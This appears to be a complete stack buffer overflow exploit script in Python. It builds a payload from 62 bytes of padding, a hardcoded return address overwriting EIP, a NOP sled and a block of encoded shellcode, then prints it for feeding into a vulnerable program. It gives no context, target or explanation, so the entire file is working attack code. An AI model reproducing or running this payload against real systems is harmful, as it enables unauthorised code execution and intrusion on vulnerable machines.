#!/usr/bin/python

# buffer
buffer = "A" * 62

# eip placeholder
# eip = "B" * 4

# eip
eip = "\x6f\x5d\xf6\xf7"

# NOP sled
nop = "\x90" * 10

#shellcode
buf =  b""
buf += b"\xd9\xe5\xb8\x27\x2a\x70\x08\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x0e\x31\x47\x19\x03\x47\x19\x83\xef\xfc\xc5"
buf += b"\xdf\x1a\x03\x51\xb9\x89\x75\x09\x94\x4e\xf3\x2e\x8e"
buf += b"\xbf\x70\xd8\x4f\xa8\x59\x7a\x39\x46\x2f\x99\xeb\x7e"
buf += b"\x3c\x5d\x0c\x7f\x34\x35\x63\x1e\xd7\xac\x5b\xc6\x01"
buf += b"\x0e\xf4\x69\x3d\x3a\x6a\x17\xac\xa7\x72\x80\x7d\xae"
buf += b"\x92\xe3\x02"

print(buffer + eip + nop + buf)